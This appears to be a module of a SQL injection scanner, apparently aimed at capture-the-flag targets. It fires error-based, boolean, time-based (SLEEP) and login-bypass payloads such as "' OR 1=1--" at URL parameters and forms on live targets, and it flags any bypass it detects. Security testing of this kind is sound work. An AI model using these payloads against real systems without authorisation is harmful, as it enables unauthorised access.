import json
import os
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import List, Dict, Optional, Tuple
from rich.console import Console

from utils.http import safe_get, get_response_time
from utils.patterns import find_sql_errors
from utils.diff import responses_differ, detect_time_based_difference

console = Console()

PAYLOADS_PATH = os.path.join(os.path.dirname(__file__), '..', 'data', 'payloads.json')

def load_payloads() -> Dict:
    try:
        with open(PAYLOADS_PATH, 'r') as f:
            data = json.load(f)
            return data.get('sqli', {})
    except Exception:
        return {
            "error_based": ["'", "\"", "' OR '1'='1", "1' ORDER BY 1--+"],
            "blind_boolean": ["' AND 1=1--", "' AND 1=2--"],
            "time_based": ["' AND SLEEP(5)--"]
        }


def inject_parameter(url: str, param: str, value: str) -> str:
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    
    params[param] = [value]
    
    new_query = urlencode(params, doseq=True)
    return urlunparse((
        parsed.scheme, parsed.netloc, parsed.path,
        parsed.params, new_query, parsed.fragment
    ))


def test_error_based(ctx, url: str, param: str, payloads: List[str]) -> Optional[str]:
    for payload in payloads[:10]:
        test_url = inject_parameter(url, param, payload)
        response, error = safe_get(test_url)
        
        if error or not response:
            continue
        
        sql_errors = find_sql_errors(response.text)
        if sql_errors:
            finding_str = f"SQL Injection (Error-based) in parameter '{param}': {sql_errors[0][:100]}"
            result = {
                "url": url,
                "injection": "Error-based",
                "payload": payload,
                "response": sql_errors[0][:100]
            }
            return finding_str, result
    
    return None, None


def test_blind_boolean(ctx, url: str, param: str, payloads: Dict) -> Optional[str]:
    boolean_payloads = payloads.get('blind_boolean', [])
    if len(boolean_payloads) < 2:
        return None, None
    
    baseline_resp, _ = safe_get(url)
    if not baseline_resp:
        return None, None
    
    true_url = inject_parameter(url, param, boolean_payloads[0])
    true_resp, _ = safe_get(true_url)
    
    false_url = inject_parameter(url, param, boolean_payloads[1])
    false_resp, _ = safe_get(false_url)
    
    if not true_resp or not false_resp:
        return None, None
    
    if responses_differ(true_resp.text, false_resp.text, threshold=0.9):
        finding_str = f"SQL Injection (Blind Boolean) detected in parameter '{param}'"
        result = {
            "url": url,
            "injection": "Blind Boolean",
            "payload": boolean_payloads[0],
            "response": "Response differs between true/false conditions"
        }
        return finding_str, result
    
    return None, None


def test_time_based(ctx, url: str, param: str, payloads: List[str]) -> Optional[str]:
    baseline_time = get_response_time(url)
    if baseline_time is None:
        return None, None
    
    for payload in payloads[:3]:
        test_url = inject_parameter(url, param, payload)
        
        injected_time = get_response_time(test_url)
        if injected_time is None:
            continue
        
        is_vulnerable, reason = detect_time_based_difference(
            baseline_time, injected_time, delay_threshold=4.0
        )
        
        if is_vulnerable:
            finding_str = f"SQL Injection (Time-based) in parameter '{param}': {reason}"
            result = {
                "url": url,
                "injection": "Time-based",
                "payload": payload,
                "response": reason
            }
            return finding_str, result
    
    return None, None


def test_form_sqli(ctx, form: Dict, payloads: Dict) -> List[str]:
    import requests
    from urllib.parse import urljoin
    
    findings = []
    structured_results = []
    
    raw_action = form.get('action', '')
    action = urljoin(ctx.base_url, raw_action) if raw_action else ctx.base_url
    
    method = form.get('method', 'GET').upper()
    inputs = form.get('inputs', [])
    
    if not inputs:
        return findings, structured_results
    
    base_data = {}
    text_inputs = []
    
    for inp in inputs:
        name = inp.get('name')
        if not name:
            continue
        input_type = inp.get('type', 'text').lower()
        value = inp.get('value', '')
        
        base_data[name] = value
        
        if input_type in ['text', 'password', 'email', 'search', '']:
            text_inputs.append(name)
    
    if not text_inputs:
        return findings, structured_results
    
    for name in text_inputs:
        if not base_data.get(name):
            base_data[name] = 'test'
    
    def send_form(data: Dict) -> Optional[requests.Response]:
        try:
            if method == 'POST':
                return requests.post(action, data=data, timeout=5, verify=False, allow_redirects=True)
            else:
                return requests.get(action, params=data, timeout=5, verify=False, allow_redirects=True)
        except Exception:
            return None
    
    def get_full_text(resp: requests.Response) -> str:
        parts = []
        for hist_resp in resp.history:
            if hist_resp.text:
                parts.append(hist_resp.text)
            location = hist_resp.headers.get('Location', '')
            if location:
                parts.append(f" redirect_to: {location}")
        parts.append(resp.text)
        return ' '.join(parts)
    
    def did_redirect(resp: requests.Response) -> bool:
        return len(resp.history) > 0
    
    baseline_data = base_data.copy()
    baseline_resp = send_form(baseline_data)
    if not baseline_resp:
        return findings, structured_results
    
    baseline_full_text = get_full_text(baseline_resp)
    baseline_len = len(baseline_resp.text)
    baseline_url = str(baseline_resp.url)
    baseline_status = baseline_resp.status_code
    baseline_redirected = did_redirect(baseline_resp)
    
    all_payloads = []
    for category in ['error_based', 'blind_boolean']:
        all_payloads.extend(payloads.get(category, []))
    
    strong_indicators = [
        'picoctf', 'ctf{', 'flag{', 'congratulations', 'flag is',
        'here is your flag', 'picoctf{','hqx{','htb{','here\'s your flag','here\'s the flag',
    ]
    
    bypass_indicators = [
        'account', 'dashboard', 'welcome', 'logout', 'sign out',
        'my profile', 'settings', 'balance', 'transfer',
        'logged in', 'session', 'admin panel', 'flag',
        'success', 'authenticated', 'authorized', 'home page',
    ]
    
    failure_indicators = [
        'failed', 'invalid', 'incorrect', 'wrong', 'error',
        'denied', 'try again', 'not found', 'bad password',
        'login failed', 'authentication failed',
    ]
    
    baseline_lower = baseline_resp.text.lower()
    baseline_failures = [kw for kw in failure_indicators if kw in baseline_lower]
    
    found_error = False
    found_bypass = False
    
    auth_bypass_payloads = [
        "' OR 1=1-- ",
        "' OR 1=1--",
        "' OR '1'='1'-- ",
        "' OR '1'='1",
        "' OR '1'='1'#",
        "admin'--",
        "admin' OR '1'='1",
        "' OR 1=1#",
        "') OR ('1'='1",
        "') OR ('1'='1'--",
        "\" OR \"1\"=\"1",
        "\" OR \"1\"=\"1\"--",
        "1' OR '1'='1'/*",
        "' OR ''='",
    ]
    
    combined_payloads = auth_bypass_payloads + all_payloads
    
    for payload in combined_payloads:
        if found_bypass:
            break
        
        test_data = base_data.copy()
        for field in text_inputs:
            test_data[field] = payload
        
        resp = send_form(test_data)
        if not resp:
            continue
        
        resp_full = get_full_text(resp)
        resp_lower = resp_full.lower()
        resp_len = len(resp.text)
        resp_url = str(resp.url)
        resp_redirected = did_redirect(resp)
        url_changed = resp_url != baseline_url
        
        if not found_error:
            sql_errors = find_sql_errors(resp_full)
            if sql_errors:
                findings.append(
                    f"SQL Injection (Error-based) in form at {action} | "
                    f"Payload: {payload} | Error: {sql_errors[0][:80]}"
                )
                structured_results.append({
                    "url": action,
                    "injection": "Error-based (all fields)",
                    "payload": payload,
                    "response": sql_errors[0][:80]
                })
                found_error = True
                continue
        
        if not found_bypass:
            len_diff = abs(resp_len - baseline_len)
            has_strong_indicator = any(kw in resp_lower for kw in strong_indicators)
            has_bypass_keyword = any(kw in resp_lower for kw in bypass_indicators)
            
            failure_gone = False
            if baseline_failures:
                remaining = [kw for kw in baseline_failures if kw in resp_lower]
                if len(remaining) < len(baseline_failures):
                    failure_gone = True
            
            is_bypass = False
            bypass_reason = ""
            
            if has_strong_indicator:
                is_bypass = True
                bypass_reason = "Flag/CTF content detected in response"
            
            elif resp_redirected and not baseline_redirected:
                is_bypass = True
                bypass_reason = f"Redirect detected (→ {resp_url})"
            
            elif failure_gone and (has_bypass_keyword or len_diff > 50):
                is_bypass = True
                bypass_reason = "Login failure message disappeared"
            
            elif has_bypass_keyword and (len_diff > 50 or resp.status_code != baseline_status):
                is_bypass = True
                bypass_reason = "Bypass keyword detected with response change"
            
            elif failure_gone and len_diff > 0:
                is_bypass = True
                bypass_reason = "Response content changed after injection"
            
            if is_bypass:
                bypass_response = (
                    f"{bypass_reason} "
                    f"({baseline_len}B → {resp_len}B, URL: {resp_url})"
                )
                findings.append(
                    f"SQL Injection (Auth Bypass) in form at {action} | "
                    f"Payload: {payload} | Result: {bypass_response}"
                )
                structured_results.append({
                    "url": action,
                    "injection": "Auth Bypass (all fields)",
                    "payload": payload,
                    "response": bypass_response
                })
                found_bypass = True
    
    if found_error and found_bypass:
        return findings, structured_results
    
    for field in text_inputs[:2]:
        for payload in all_payloads:
            test_data = base_data.copy()
            test_data[field] = payload
            
            resp = send_form(test_data)
            if not resp:
                continue
            
            resp_full = get_full_text(resp)
            resp_lower = resp_full.lower()
            resp_len = len(resp.text)
            resp_url = str(resp.url)
            resp_redirected = did_redirect(resp)
            url_changed = resp_url != baseline_url
            
            if not found_error:
                sql_errors = find_sql_errors(resp_full)
                if sql_errors:
                    findings.append(
                        f"SQL Injection (Error-based) in '{field}' at {action} | "
                        f"Payload: {payload} | Error: {sql_errors[0][:80]}"
                    )
                    structured_results.append({
                        "url": action,
                        "injection": f"Error-based (form field: {field})",
                        "payload": payload,
                        "response": sql_errors[0][:80]
                    })
                    found_error = True
                    continue
                
                sql_keywords = ['sql syntax', 'mysql', 'sqlite', 'postgresql', 'oracle',
                               'syntax error', 'odbc', 'jdbc', 'unclosed quotation']
                for kw in sql_keywords:
                    if kw in resp_lower:
                        findings.append(
                            f"SQL Injection (Error-based) in '{field}' at {action} | "
                            f"Payload: {payload} | Error: '{kw}' detected in response"
                        )
                        structured_results.append({
                            "url": action,
                            "injection": f"Error-based (form field: {field})",
                            "payload": payload,
                            "response": f"'{kw}' detected in response"
                        })
                        found_error = True
                        break
            
            if not found_bypass:
                len_diff = abs(resp_len - baseline_len)
                has_strong_indicator = any(kw in resp_lower for kw in strong_indicators)
                has_bypass_keyword = any(kw in resp_lower for kw in bypass_indicators)
                
                failure_gone = False
                if baseline_failures:
                    remaining = [kw for kw in baseline_failures if kw in resp_lower]
                    if len(remaining) < len(baseline_failures):
                        failure_gone = True
                
                is_bypass = False
                bypass_reason = ""
                
                if has_strong_indicator:
                    is_bypass = True
                    bypass_reason = "Flag/CTF content detected in response"
                
                elif resp_redirected and not baseline_redirected:
                    is_bypass = True
                    bypass_reason = f"Redirect detected (→ {resp_url})"
                
                elif failure_gone and (has_bypass_keyword or len_diff > 50):
                    is_bypass = True
                    bypass_reason = "Login failure message disappeared"
                
                elif has_bypass_keyword and (len_diff > 50 or url_changed):
                    is_bypass = True
                    bypass_reason = "Bypass keyword detected with response change"
                
                elif url_changed and len_diff > 200:
                    is_bypass = True
                    bypass_reason = f"URL changed to {resp_url}"
                
                elif failure_gone and len_diff > 0:
                    is_bypass = True
                    bypass_reason = "Response content changed after injection"
                
                if is_bypass:
                    bypass_response = (
                        f"{bypass_reason} "
                        f"({baseline_len}B → {resp_len}B, URL: {resp_url})"
                    )
                    findings.append(
                        f"SQL Injection (Auth Bypass) in '{field}' at {action} | "
                        f"Payload: {payload} | Result: {bypass_response}"
                    )
                    structured_results.append({
                        "url": action,
                        "injection": f"Auth Bypass (form field: {field})",
                        "payload": payload,
                        "response": bypass_response
                    })
                    found_bypass = True
            
            if found_error and found_bypass:
                return findings, structured_results
    
    return findings, structured_results


def run(ctx):
    import requests
    requests.packages.urllib3.disable_warnings()
    
    payloads = load_payloads()
    findings_count = 0
    
    if not hasattr(ctx, 'sqli_results'):
        ctx.sqli_results = []
    
    tested_forms = set()
    
    if hasattr(ctx, 'forms') and ctx.forms:
        for form in ctx.forms[:10]:
            action = form.get('action', '')
            form_key = f"{action}:{','.join(sorted([i.get('name','') for i in form.get('inputs', [])]))}"
            
            if form_key in tested_forms:
                continue
            tested_forms.add(form_key)

            form_findings, form_structured = test_form_sqli(ctx, form, payloads)
            if form_findings:
                ctx.findings.extend(form_findings)
                ctx.sqli_results.extend(form_structured)
                findings_count += len(form_findings)
    
    urls_to_test = []
    
    if hasattr(ctx, 'urls') and ctx.urls:
        for url in ctx.urls:
            parsed = urlparse(url)
            if parsed.query:
                urls_to_test.append(url)
    
    base_parsed = urlparse(ctx.base_url)
    if base_parsed.query:
        urls_to_test.append(ctx.base_url)
    
    tested_params = set()
    
    for url in urls_to_test[:10]:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for param in params:
            param_key = f"{parsed.path}:{param}"
            if param_key in tested_params:
                continue
            tested_params.add(param_key)
            
            finding, result = test_error_based(ctx, url, param, payloads.get('error_based', []))
            if finding:
                ctx.findings.append(finding)
                ctx.sqli_results.append(result)
                findings_count += 1
                continue
            
            finding, result = test_blind_boolean(ctx, url, param, payloads)
            if finding:
                ctx.findings.append(finding)
                ctx.sqli_results.append(result)
                findings_count += 1
                continue
            
            finding, result = test_time_based(ctx, url, param, payloads.get('time_based', []))
            if finding:
                ctx.findings.append(finding)
                ctx.sqli_results.append(result)
                findings_count += 1

    exposed_results = getattr(ctx, 'exposed_path_results', [])
    if exposed_results:
        from core.crawler import extract_forms as _extract_forms

        parsed_base = urlparse(ctx.base_url)
        origin = f"{parsed_base.scheme}://{parsed_base.netloc}"

        for ep in exposed_results:
            route = ep.get('route', '')
            ep_url = origin + route

            try:
                resp, err = safe_get(ep_url)
                if err or not resp:
                    continue
                ep_forms = _extract_forms(resp.text, ep_url)
                for form in ep_forms[:5]:
                    action = form.get('action', '')
                    form_key = f"{action}:{','.join(sorted([i.get('name','') for i in form.get('inputs', [])]))}"
                    if form_key in tested_forms:
                        continue
                    tested_forms.add(form_key)

                    form_findings, form_structured = test_form_sqli(ctx, form, payloads)
                    if form_findings:
                        ctx.findings.extend(form_findings)
                        ctx.sqli_results.extend(form_structured)
                        findings_count += len(form_findings)
            except Exception:
                continue
